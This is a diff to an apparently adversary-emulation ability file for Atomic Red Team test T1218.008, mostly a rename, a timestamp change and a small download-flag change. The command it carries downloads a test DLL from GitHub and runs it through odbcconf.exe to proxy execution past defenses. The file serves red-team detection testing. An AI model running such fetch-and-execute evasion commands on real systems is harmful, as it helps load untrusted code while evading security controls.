@@ -4,7 +4,7 @@
   tactic: stealth
   technique:
     attack_id: T1218.008
-    name: 'Signed Binary Proxy Execution: Odbcconf'
+    name: 'System Binary Proxy Execution: Odbcconf'
   platforms:
     windows:
       sh:
@@ -12,17 +12,17 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll"
-          -OutFile "PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll"; fi; odbcconf.exe
-          /S /A {REGSVR "PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll"}'
+          -OutFile "PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll" -UseBasicParsing;
+          fi; odbcconf.exe /S /A {REGSVR "PathToAtomicsFolder\T1218.008\src\Win32\T1218-2.dll"}'
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
+  - stealth
   - t1218.008
   - atomic-red-team
-  - stealth
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -41,9 +41,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll"
-        -OutFile "#{dll_payload}"
+        -OutFile "#{dll_payload}" -UseBasicParsing
 
         '
     technique_created: '2020-01-24T15:01:32.917Z'
     atomic_guid: 2430498b-06c0-4b92-a448-8ad263c388e2
-    import_timestamp: '2026-10-20T07:08:26.644094Z'
+    import_timestamp: '2026-10-21T07:01:49.405143Z'
